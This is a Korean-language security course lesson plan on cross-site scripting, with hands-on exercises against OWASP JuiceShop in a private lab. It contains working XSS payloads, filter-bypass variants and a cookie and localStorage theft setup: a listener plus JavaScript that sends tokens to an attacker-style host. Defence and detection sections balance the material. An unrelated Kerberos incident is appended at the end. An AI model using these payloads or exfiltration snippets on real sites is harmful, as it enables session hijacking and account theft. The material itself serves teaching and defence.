# Week 05: OWASP Top 10 (2) — XSS (Cross-Site Scripting)

## 학습 목표
- XSS의 개념과 위험성을 이해한다
- Reflected, Stored, DOM-based XSS의 차이를 파악한다
- JuiceShop에서 3가지 XSS 유형을 모두 실습한다
- JavaScript로 쿠키·localStorage 탈취 시나리오를 재현한다
- XSS 방어 기법(출력 인코딩, CSP, HttpOnly, DOMPurify)을 설명한다
- 공격이 SIEM·WAF에서 어떻게 탐지되는지 파악한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| manager | 10.20.30.200 | 실습 기지, Bastion API :8003, 쿠키 수신용 임시 서버 호스트 |
| web | 10.20.30.80 | JuiceShop :3000 (공격 대상) |
| 학생 브라우저 | - | DOM XSS는 브라우저에서만 실행 가능 |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:30 | XSS 개론 + SQLi 비교 (Part 1~2) | 강의 |
| 0:30-1:00 | 3가지 XSS 유형 이론 (Part 3) | 강의 |
| 1:00-1:10 | 휴식 | - |
| 1:10-1:50 | JuiceShop DOM XSS·Reflected XSS (Part 4) | 실습 |
| 1:50-2:30 | Stored XSS + 페이로드 변형 (Part 5~6) | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 쿠키 탈취 시나리오 (Part 7) | 실습 |
| 3:10-3:30 | 방어·탐지·Bastion 자동화 (Part 8~10) | 실습 |
| 3:30-3:40 | 정리 + 과제 | 정리 |

---

# Part 1: XSS 개론

XSS(Cross-Site Scripting)는 공격자가 웹 페이지에 **악성 JavaScript 코드를 삽입**하여, 다른 사용자의 브라우저에서 실행시키는 공격이다.

> **이름의 유래:** CSS(Cascading Style Sheets)와 구분하기 위해 XSS로 쓴다.

## 1.1 왜 위험한가

JavaScript가 피해자 브라우저에서 실행되면 가능한 것:
- **쿠키/세션 토큰 탈취** → 피해자 계정으로 로그인
- **키 입력 기록** → 비밀번호, 신용카드 번호 수집
- **페이지 내용 변조** → 가짜 로그인 폼 표시
- **악성 사이트 리다이렉트**
- **CSRF 공격 수행** → 사용자 모르게 행동 실행

## 1.2 SQL Injection vs XSS 비교

| 구분 | SQL Injection | XSS |
|------|---------------|-----|
| 공격 대상 | 서버(데이터베이스) | 클라이언트(브라우저) |
| 삽입 코드 | SQL 구문 | JavaScript |
| 실행 위치 | 서버 DB 엔진 | 피해자 브라우저 |
| 피해 | 데이터 유출·변조 | 세션 탈취, 페이지 변조 |
| 방어 난이도 | 낮음 (매개변수화만 하면) | 높음 (모든 출력 지점에서 인코딩) |

**XSS가 흔한 이유:** 매개변수화 하나로 끝나는 SQLi와 달리, XSS는 **모든 출력 지점에서** 인코딩해야 한다. 하나만 빠뜨려도 취약점이 된다.

---

# Part 2: 실제 사례로 보는 XSS 피해 규모

| 연도 | 사례 | 피해 |
|------|------|------|
| 2018 | British Airways | Stored XSS로 38만건 신용카드 유출, GDPR 벌금 £20M |
| 2019 | Fortnite | DOM XSS로 계정 탈취 가능성 |
| 2023 | Zendesk | Stored XSS → 세션 탈취 CVE-2023-39520 |

**XSS는 "Low"로 분류되기 쉽지만**, 쿠키 탈취 → 계정 접근 → 데이터 유출로 이어지면 **HIGH**. 분류와 실제 피해를 혼동하지 말아야 한다.

---

# Part 3: XSS 유형

## 3.1 Reflected XSS (반사형)

공격 코드가 URL에 포함되어, 서버가 응답에 그대로 반영(reflect)한다. 피해자가 **악성 링크를 클릭**해야 동작.

**동작 흐름:**
```
1. 공격자가 악성 URL 생성:
   http://target.com/search?q=<script>alert('XSS')</script>

2. 피해자가 이 링크를 클릭 (피싱·SNS 등으로 유도)

3. 서버가 검색 결과 페이지를 만들면서 입력을 그대로 포함:
   "검색어: <script>alert('XSS')</script>에 대한 결과"

4. 피해자 브라우저에서 JavaScript 실행
```

## 3.2 Stored XSS (저장형)

공격 코드가 서버의 **데이터베이스에 저장**되어, 해당 데이터를 보는 **모든 사용자**에게 영향을 준다. Reflected보다 훨씬 위험하다.

**동작 흐름:**
```
1. 공격자가 게시글·댓글에 악성 스크립트 작성
   내용: "좋은 제품이에요! <script>fetch('//attacker/?c='+document.cookie)</script>"

2. 서버가 DB에 저장

3. 다른 사용자가 해당 게시글을 볼 때마다 스크립트 실행

4. 피해자 쿠키가 공격자 서버로 전송
```

## 3.3 DOM-based XSS

서버를 거치지 않고, **클라이언트 측 JavaScript**가 DOM을 조작할 때 발생한다. 서버 로그에 흔적이 거의 남지 않아 탐지가 어렵다.

**동작 흐름:**
```
1. 웹 페이지의 JavaScript가 URL 파라미터를 읽어서 페이지에 삽입:
   document.getElementById('output').innerHTML = location.hash.substring(1);

2. 공격자가 URL 조작:
   http://target.com/page#<img src=x onerror=alert('XSS')>

3. JavaScript가 DOM에 직접 삽입 → 브라우저에서 실행
```

**JuiceShop은 SPA(Single Page Application)이므로 주로 DOM XSS가 대상**이다.

---

# Part 4: JuiceShop XSS 실습

## 4.1 DOM XSS — 검색 기능

**이것은 무엇인가?** JuiceShop의 검색 페이지(`/#/search?q=...`)는 URL 해시의 `q` 파라미터를 DOM에 innerHTML로 삽입한다. `<script>` 태그는 innerHTML 삽입 시 실행되지 않지만, `<iframe src="javascript:...">`, `<img onerror=...>` 같은 이벤트 핸들러는 실행된다.

**중요 — 왜 curl로는 실행이 안 되는가:**
- curl은 HTTP 클라이언트일 뿐, JavaScript를 **실행하지 않는다**
- DOM XSS는 브라우저가 JS를 실행해야 발동
- curl로는 "서버가 필터링하는가"만 확인 가능, 실제 공격 검증은 **브라우저 필수**

### Step 1: curl로 서버 필터 확인

```bash
curl -s "http://10.20.30.80:3000/rest/products/search?q=%3Ciframe%20src%3D%22javascript:alert(1)%22%3E" \
  | python3 -m json.tool | head -10
```

**명령 분해:**
- `%3C`=`<`, `%3E`=`>`, `%22`=`"`, `%20`=공백 — URL 인코딩
- 서버가 이 페이로드를 검색어로 받아서 DB 조회 시도

**예상 출력:** `{"status":"success","data":[]}` — 서버는 페이로드를 일반 문자열로 취급하여 검색 결과가 없다고 응답. **서버 자체는 XSS 실행하지 않음.**

### Step 2: 브라우저에서 DOM XSS 실행

학생 PC 브라우저에서:

```
http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(`XSS`)">
```

**브라우저가 하는 일:**
1. JuiceShop 프론트엔드 JS가 URL 해시의 `q` 값을 읽음
2. 검색 결과 페이지의 "검색어: ..." 영역 DOM에 innerHTML로 삽입
3. `<iframe>`이 DOM에 들어가면서 `src="javascript:..."`가 자동 실행
4. **alert 창 팝업** → DOM XSS 성공

**왜 `<script>`가 안 되고 `<iframe>`은 되는가:** HTML5 명세에서 `innerHTML` 삽입 시 `<script>`는 실행되지 않는다. 하지만 `<iframe src="javascript:...">`, `<img onerror=...>`, `<svg onload=...>` 같은 **이벤트 핸들러 내장 태그**는 삽입과 동시에 이벤트가 발생하여 실행된다.

## 4.2 Reflected XSS — 주문 추적

**이것은 무엇인가?** JuiceShop의 `/#/track-result?id=...` 페이지는 URL 파라미터를 DOM에 반영한다.

```bash
# curl로 서버 응답 관찰 (실행 여부는 브라우저에서 확인)
curl -s "http://10.20.30.80:3000/rest/track-order/xyz" | python3 -m json.tool | head
```

**브라우저에서 실제 실습:**
```
http://10.20.30.80:3000/#/track-result?id=<iframe src="javascript:alert(`reflected-xss`)">
```

## 4.3 Stored XSS — 피드백

**이것은 무엇인가?** 서버 DB에 XSS 페이로드를 저장시켜, 피드백 페이지를 **다른 사용자**가 볼 때 실행되게 한다.

```bash
# Step 1: 로그인하여 토큰 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 계정이 없으면 먼저 생성
if [ -z "$TOKEN" ]; then
  curl -s -X POST http://10.20.30.80:3000/api/Users/ \
    -H "Content-Type: application/json" \
    -d '{"email":"student@test.com","password":"Student123!","passwordRepeat":"Student123!","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"test"}' > /dev/null
  TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"student@test.com","password":"Student123!"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
fi

echo "Token: ${TOKEN:0:40}..."
```

```bash
# Step 2: captcha 획득 (JuiceShop 피드백은 captcha 필요)
CAPTCHA_RESP=$(curl -s http://10.20.30.80:3000/api/Captchas/ -H "Authorization: Bearer $TOKEN")
CAPTCHA_ID=$(echo "$CAPTCHA_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['captchaId'])")
CAPTCHA_ANS=$(echo "$CAPTCHA_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['answer'])")
echo "captchaId=$CAPTCHA_ID, answer=$CAPTCHA_ANS"

# Step 3: XSS 페이로드를 피드백으로 저장 시도
curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{
    \"UserId\": 1,
    \"captchaId\": $CAPTCHA_ID,
    \"captcha\": \"$CAPTCHA_ANS\",
    \"comment\": \"Great shop! <iframe src=\\\"javascript:alert('stored-xss')\\\">\",
    \"rating\": 5
  }" | python3 -m json.tool
```

**결과 해석:**
- `201 Created` 응답이면 저장 성공
- 브라우저에서 `http://10.20.30.80:3000/#/about` (About 페이지에 피드백 표시됨) 접근 시 저장된 XSS가 실행됨
- **모든 방문자에게 발동** — Reflected 대비 위험도 훨씬 큼

---

# Part 5: XSS 페이로드 사전

실무에서 자주 쓰이는 페이로드를 이해해두면 우회·방어 양쪽에 도움이 된다.

## 5.1 기본 페이로드

```html
<!-- 가장 기본 (innerHTML에선 실행 안 되는 경우 많음) -->
<script>alert('XSS')</script>

<!-- img onerror — 이미지 로드 실패 시 실행 -->
<img src=x onerror=alert('XSS')>

<!-- iframe javascript: -->
<iframe src="javascript:alert('XSS')">

<!-- SVG onload -->
<svg onload=alert('XSS')>

<!-- body onload -->
<body onload=alert('XSS')>

<!-- input autofocus onfocus -->
<input onfocus=alert('XSS') autofocus>
```

## 5.2 필터 우회 기법

```html
<!-- 대소문자 혼합 (`<script>` 필터만 있을 때) -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- HTML 엔티티 인코딩 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>
<!-- &#97;=a, &#108;=l, &#101;=e, &#114;=r, &#116;=t → alert -->

<!-- 이중 태그 (순차 제거 필터 우회) -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<!-- 필터가 <script>를 한 번 제거하면 남는 문자열이 <script> -->

<!-- 백틱 (따옴표 필터 우회) -->
<img src=x onerror=alert(`XSS`)>
```

## 5.3 페이로드 자동 테스트

```bash
PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "<iframe src='javascript:alert(1)'>"
  "<ScRiPt>alert(1)</ScRiPt>"
  "<img src=x onerror=alert\`1\`>"
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/rest/products/search?q=$encoded")
  echo "  HTTP $code : $payload"
done
```

**결과 해석:**
- 모든 페이로드가 200을 반환하면 **서버 레벨 필터 없음** (DOM XSS는 브라우저에서 확정 필요)
- 403/500이 섞이면 WAF(ModSecurity 등)가 특정 패턴만 차단 → 변형 필요

---

# Part 6: URL 인코딩과 XSS

## 6.1 왜 인코딩이 중요한가

HTTP URL에는 **예약 문자**(`<`, `>`, `"`, `&`, 공백)가 포함될 수 없다. 브라우저/클라이언트는 이를 자동으로 `%XX` 형태로 인코딩하여 전송한다.

**공격자 관점:** 페이로드의 특수문자를 어떻게 인코딩하느냐로 필터 우회 성공 여부가 달라진다.

## 6.2 인코딩 계층

| 계층 | 변환 예 | 용도 |
|------|---------|------|
| URL (percent) | `<` → `%3C` | URL 파라미터 |
| HTML entity | `<` → `&lt;` | HTML 본문 (방어용) |
| JavaScript | `"` → `\"` | JS 문자열 내부 |
| Unicode | `a` → `a` | JS 문자 우회 |

```bash
# URL 인코딩 헬퍼
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))"
# 출력: %3Cscript%3Ealert%281%29%3C/script%3E
```

---

# Part 7: 쿠키·localStorage 탈취 시뮬레이션

실제 공격에서 XSS의 가장 흔한 용도는 **세션 토큰 탈취**다. 여기서는 manager 서버에서 간이 수신 서버를 띄우고, XSS 성공 시 어떤 요청이 오는지 시뮬레이션한다.

## 7.1 수신 서버 기동

**이것은 무엇인가?** 공격자가 탈취한 쿠키를 받기 위해 자신의 서버에 올려두는 수신기. 실습에서는 manager VM에 포트 9999로 임시 서버를 띄운다.

```bash
# manager에서 (이미 ssh로 접속한 상태 가정)
python3 << 'PYEOF' &
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[STOLEN] path={self.path} headers={dict(self.headers)}', flush=True)
        self.send_response(200); self.end_headers()
    def log_message(self, *args): pass
HTTPServer(('0.0.0.0', 9999), H).serve_forever()
PYEOF
STEAL_PID=$!
echo "수신서버 PID: $STEAL_PID (포트 9999)"
```

## 7.2 XSS 성공 시 브라우저가 보낼 요청 시뮬레이션

실제 상황에서는 피해자 브라우저가 실행한 JS가 다음과 같은 요청을 보낸다:

```javascript
// 공격자 XSS 페이로드에 담긴 JS (실제 브라우저에서 실행된다고 가정)
new Image().src = "http://10.20.30.200:9999/steal?cookie=" + document.cookie
                  + "&token=" + localStorage.getItem('token');
```

curl로 이 요청을 흉내내자 (수신서버 동작 검증):

```bash
curl -s "http://10.20.30.200:9999/steal?cookie=sid=abc123&token=eyJhbGc..." > /dev/null
```

**수신서버 출력 확인:**
```
[STOLEN] path=/steal?cookie=sid=abc123&token=eyJhbGc... headers={'Host': ...}
```

수신서버 종료:

```bash
kill $STEAL_PID 2>/dev/null
```

## 7.3 HttpOnly 플래그의 방어 효과

쿠키에 `HttpOnly` 플래그가 있으면 **JavaScript에서 `document.cookie`로 접근 불가**. XSS가 성공해도 쿠키 탈취는 막힌다.

```bash
# JuiceShop 로그인 응답의 Set-Cookie 확인
curl -v -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' 2>&1 \
  | grep -iE "set-cookie|authentication"
```

**결과 해석:**
- JuiceShop은 `Set-Cookie`를 사용하지 **않고** JSON 응답에 JWT를 반환 → 클라이언트가 **localStorage**에 저장
- **localStorage는 HttpOnly 적용 불가** → XSS로 `localStorage.getItem('token')` 탈취 가능
- 이것이 "HttpOnly 쿠키 vs localStorage JWT" 설계 차이의 보안적 의미

---

# Part 8: XSS 방어

## 8.1 출력 인코딩 (가장 중요)

사용자 입력을 HTML에 삽입할 때 특수문자를 **HTML 엔티티**로 변환한다.

| 문자 | 엔티티 |
|------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

**취약한 코드:**
```javascript
// 사용자 입력을 그대로 HTML로 삽입 — 위험!
document.getElementById('output').innerHTML = userInput;
```

**안전한 코드:**
```javascript
// textContent는 HTML로 해석하지 않음
document.getElementById('output').textContent = userInput;

// 또는 프레임워크의 자동 이스케이프 사용 (Angular, React, Vue 등은 기본적으로 안전)
```

## 8.2 Content Security Policy (CSP)

CSP는 브라우저에게 "이 페이지에서 실행할 수 있는 스크립트의 출처"를 알려주는 HTTP 헤더다.

```bash
curl -sI http://10.20.30.80:3000/ | grep -i "content-security-policy"
```

**JuiceShop의 CSP:** 없음 (의도적 취약점)

**CSP 예시 (방어 적용):**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

**효과:**
- `default-src 'self'`: 같은 출처의 리소스만 허용
- `script-src 'self' cdn.example.com`: 스크립트는 자체 도메인 + 지정 CDN만
- **인라인 스크립트(`<script>alert(1)</script>`) 차단**
- XSS가 DOM에 삽입되어도 **실행 자체가 차단**

## 8.3 DOMPurify — 런타임 HTML 새니타이저

```javascript
// DOMPurify 라이브러리로 HTML 정화
const clean = DOMPurify.sanitize(userInput);
document.getElementById('output').innerHTML = clean;
// <script>, <iframe>, onerror 등 위험 요소 자동 제거
```

**화이트리스트 방식**으로 "허용된 태그·속성"만 남기고 나머지는 제거하므로 안전하다.

## 8.4 HttpOnly + SameSite 쿠키

```javascript
// 서버에서 쿠키 설정 시
res.cookie('session', token, {
  httpOnly: true,   // JS 접근 차단
  secure: true,     // HTTPS 전용
  sameSite: 'strict' // CSRF 방어
});
```

---

# Part 9: 탐지 (Blue Team 관점)

## 9.1 웹 서버 로그에서 XSS 흔적

**이것은 무엇인가?** XSS 페이로드는 URL 파라미터·POST 본문을 통해 전달된다. 서버 접근 로그에 `<`, `script`, `onerror` 같은 키워드가 남는다.

```bash
ssh ccc@10.20.30.80 \
  "sudo tail -100 /var/log/apache2/access.log | grep -iE '<script|onerror|onload|javascript:'" 2>/dev/null | head -5
```

## 9.2 Wazuh 알림

```bash
ssh ccc@10.20.30.100 \
  "sudo grep -iE 'xss|cross.site|script' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3"
```

## 9.3 Suricata IPS 패턴

```bash
ssh ccc@10.20.30.1 "sudo grep -iE 'script|onerror' /var/log/suricata/fast.log" 2>/dev/null | tail -3
```

**주요 XSS Suricata 룰:**
- `ET WEB_SPECIFIC_APPS XSS Attempt`
- `ET WEB_CLIENT Possible XSS Attempt`

**한계:** DOM XSS는 서버까지 요청이 가지만, 페이로드 일부가 `#` 해시 뒤에 있으면 서버 로그에 기록되지 않음. Week 09~10에서 이 우회 기법을 심화 학습.

---

# Part 10: Bastion 자연어 XSS 점검

```bash
curl -s -X POST http://10.20.30.200:8003/ask \
  -H 'Content-Type: application/json' \
  -d '{
    "message": "JuiceShop(http://10.20.30.80:3000) 응답에서 XSS 방어 헤더 3종(Content-Security-Policy, X-XSS-Protection, X-Frame-Options) 설정 여부를 확인하고, 누락된 헤더별 위험도를 분석해줘."
  }' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
```

```bash
# 이번 주 Bastion 작업 기록
curl -s "http://10.20.30.200:8003/evidence?limit=5" | python3 -c "
import sys, json
for e in json.load(sys.stdin)[:5]:
    msg = e.get('user_message','')[:70]
    ok = '✓' if e.get('success') else '✗'
    print(f'  {ok} {msg}')
"
```

---

## 과제 (다음 주까지)

### 과제 1: JuiceShop XSS 3유형 실습 (60점)

1. **DOM XSS** (20점)
   - 브라우저에서 `/#/search?q=<iframe src="javascript:alert('xss')">` 실행
   - alert 팝업 스크린샷 + 브라우저 콘솔 캡처
   - 왜 `<script>`는 안 되고 `<iframe>`은 되는지 설명

2. **Reflected XSS** (20점)
   - `/#/track-result?id=...` 에 XSS 페이로드 삽입
   - 실행 성공 스크린샷
   - URL 인코딩 과정 설명

3. **Stored XSS** (20점)
   - 피드백 API에 XSS 페이로드 저장
   - (가능하면) About 페이지에서 실행 확인
   - captcha 획득 → 피드백 저장 전 과정 bash 스크립트 제출

### 과제 2: 탈취 시뮬레이션 + 방어 제안 (40점)

**각 10점:**
1. manager에 수신 서버(:9999) 기동 → curl로 탈취 시뮬레이션 로그 캡처
2. `HttpOnly` vs `localStorage` — JuiceShop의 JWT 저장 방식이 왜 XSS에 취약한지 분석
3. JuiceShop에 적용할 수 있는 **CSP 헤더 1줄**을 제시하고 그 효과를 설명
4. Bastion `/ask`로 XSS 방어 헤더 점검한 결과 + `/evidence` 기록 캡처

---

## 다음 주 예고

**Week 06: Broken Access Control + 인증/세션**
- IDOR (Insecure Direct Object Reference)
- BOLA (Broken Object Level Authorization)
- JWT 서명 검증 우회 (alg=none, HS256 약한 키)
- 패스워드 해시 크래킹 (Week 04에서 추출한 MD5)

---

## 용어 해설 (이번 주 추가분)

| 용어 | 영문 | 설명 |
|------|------|------|
| **XSS** | Cross-Site Scripting | 악성 JS를 웹 페이지에 주입하는 공격 |
| **Reflected XSS** | - | URL에 페이로드 → 서버가 응답에 반영 → 실행 |
| **Stored XSS** | - | DB에 페이로드 저장 → 페이지 볼 때마다 실행 |
| **DOM XSS** | - | 서버 거치지 않고 클라이언트 JS가 DOM에 삽입 |
| **innerHTML** | - | DOM 요소의 HTML을 바꾸는 속성 (삽입 시 일부 태그 실행됨) |
| **textContent** | - | DOM 요소의 텍스트를 바꾸는 속성 (HTML로 해석 안 됨, 안전) |
| **HttpOnly** | - | JS에서 쿠키 접근 금지하는 쿠키 속성 |
| **CSP** | Content-Security-Policy | 허용 스크립트 출처 제한 헤더 |
| **DOMPurify** | DOMPurify | HTML을 화이트리스트 방식으로 정화하는 JS 라이브러리 |
| **SameSite** | SameSite 쿠키 속성 | 다른 도메인에서 쿠키 전송 금지 (CSRF 방어) |
| **payload** | Payload | 공격 코드 본체 |

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 실제로 사용한 도구만 기재.

### curl — HTTP 요청 도구

이번 주 활용:
- 서버 XSS 필터 존재 여부 확인 (`%3Cscript...`)
- 피드백 API에 페이로드 저장
- 수신 서버로 탈취 시뮬레이션 요청 발송

| 이번 주 자주 쓴 옵션 | 용도 |
|----------------------|------|
| `-v` | 요청·응답 헤더 관찰 (Set-Cookie 확인) |
| `-H 'Authorization: Bearer $TOKEN'` | 인증 필요 API |
| `-d '{...}'` | JSON 페이로드 전송 |
| `-s -o /dev/null -w '%{http_code}'` | 필터 테스트 시 상태 코드만 |

### 학생 브라우저 (Chrome/Firefox)

이번 주 **필수**. DOM XSS는 브라우저에서만 실행된다.

**필수 확인 포인트:**
| 기능 | 이번 주 사용 |
|------|--------------|
| URL 직접 입력 | `/#/search?q=<iframe ...>` 입력 |
| F12 → Console | `localStorage.getItem('token')` 수동 확인 |
| F12 → Network | 피드백 POST 요청 관찰 |
| F12 → Application → Local Storage | JWT 토큰 저장 위치 확인 |

### manager의 임시 수신 서버 (Python stdlib)

- 모듈: `http.server.HTTPServer`, `BaseHTTPRequestHandler`
- 포트: 9999 (실습 전용, 외부 노출 금지)
- 역할: XSS 탈취 시뮬레이션용 GET 요청 수신기
- 종료: `kill $STEAL_PID`

### JuiceShop XSS 관련 엔드포인트

| 엔드포인트 | 방식 | XSS 유형 |
|-----------|------|----------|
| `/#/search?q=` | URL 해시 파라미터 | DOM |
| `/#/track-result?id=` | URL 쿼리 | Reflected/DOM |
| `/api/Feedbacks/` | POST with `comment` | Stored |
| `/api/Captchas/` | GET (피드백 전제) | - |
| `/#/about` | 피드백 표시 화면 | Stored 발동 지점 |

### Bastion API — 이번 주 사용

| 메서드 | 경로 | 용도 |
|--------|------|------|
| POST | `/ask` | 자연어로 헤더/방어 점검 지시 |
| GET | `/evidence?limit=N` | 기록 조회 |

---

> **실습 환경 검증 완료** (2026-03-28): JuiceShop SQLi/XSS/IDOR, nmap, 경로탐색(%2500), sudo NOPASSWD, SSH키, crontab

---

## 실제 사례 (WitFoo Precinct 6)

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

본 주차 (5주차) 학습 주제와 직접 연관된 *실제* incident:

### Kerberos AS-REP roasting — krbtgt 외부 유출

> **출처**: WitFoo Precinct 6 / `incident-2024-08-002` (anchor: `anc-7c9fb0248f47`) · sanitized
> **시점**: 2024-08-15 11:02 ~ 11:18 (16 분)

**관찰**: win-dc01 의 PreAuthFlag=False 계정 3건 식별 + AS-REP 응답이 외부 IP 198.51.100.42 로 유출.

**MITRE ATT&CK**: **T1558.004 (AS-REP Roasting)**

**IoC**:
  - `198.51.100.42`
  - `krbtgt-hash:abc123def`

**학습 포인트**:
- PreAuthentication 비활성화 계정이 곧 공격 표면 (서비스/legacy/오설정)
- Hash 추출 → hashcat 으로 오프라인 brute force → Domain Admin 가능성
- 탐지: DC 의 EID 4768 + AS-REP 패킷 길이 / 외부 destination IP
- 방어: 모든 계정 PreAuth 활성, krbtgt 분기별 회전, FIDO2 도입


**본 강의와의 연결**: 위 사례는 강의의 핵심 개념이 어떻게 *실제 운영 환경*에서 일어나는지 보여준다. 학생은 이 패턴을 (1) 공격자 입장에서 재현 가능한가 (2) 방어자 입장에서 탐지 가능한가 (3) 자기 인프라에서 동일 신호가 있는지 검색 가능한가 — 3 관점에서 평가한다.

---

> 더 많은 사례 (총 5 anchor + 외부 표준 7 source) 는 KG (Knowledge Graph) 페이지에서 검색 가능.
> Cyber Range 실습 중 학습 포인트 박스 (📖) 에 동일 anchor 가 자동 노출된다.
